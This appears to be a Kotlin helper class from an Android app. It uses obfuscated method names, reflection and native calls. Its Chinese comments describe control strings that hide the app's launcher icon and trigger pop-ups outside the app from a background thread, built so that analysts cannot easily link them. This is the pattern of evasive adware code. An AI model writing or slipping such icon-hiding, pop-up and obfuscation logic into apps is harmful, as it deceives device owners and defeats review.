package com.water.soak

import android.app.ActivityManager
import android.app.job.JobService
import android.content.Context
import android.util.Log
import com.tencent.mmkv.MMKV

/**
 * Date：2024/8/12
 * Describe:
 */
object SteamHelper {
    private val arrayList = arrayListOf<Any>("Demo")
    private var methodName = "goToOcean"

    fun init(context: Context) {
        MMKV.initialize(context)
        arrayList.add(context)
        arrayList.add("AiskAs")
        arrayList.add("ADz112")
        runCatching {
            val clazz = Class.forName("com.water.soak.SteamHelper")
            val conClazz = Class.forName("android.content.Context")
            clazz.getMethod(methodName, conClazz).invoke(null, arrayList["1".toInt()])
        }
    }

    @JvmStatic
    fun goToOcean(context: Context) {
        val ow = OceanWater(context)
        ow.oceanLake()
    }

//    //注意:第2个参数传字符串::字符串包含"As"隐藏图标,包含"Kc"恢复隐藏.包含"Dz"外弹(外弹在子线程调用).(保证i参数不容易关联)
//    @JvmStatic
//    external fun lakeStr(context: Context, string: String): Int
//
//    // 隐藏 2 外弹是 3
//    @JvmStatic
//    fun getFlagByString(context: Context, type: String): Int {
//        runCatching {
//            val clazz = Class.forName("com.water.soak.SteamHelper")
//            val conClazz = Class.forName("android.content.Context")
//            val result = clazz.getMethod("lakeStr", conClazz, String::class.java)
//                .invoke(null, context, "$type${arrayList[type.toInt()]}")
//            if (result is Int) {
//                return result
//            }
//        }
//        return type.toInt()
//    }

    @JvmStatic
    external fun aceNm(context: Context): String

    @JvmStatic
    fun isInMe(context: Context): Boolean {
        val am: ActivityManager =
            context.getSystemService(JobService.ACTIVITY_SERVICE) as ActivityManager
        val list0: List<ActivityManager.RunningAppProcessInfo> = am.runningAppProcesses
        for (info in list0) {
            if (!info.processName.equals(context.applicationInfo.processName) || info.importance != 100) {
                continue
            }
            return true
        }
        return false
    }

}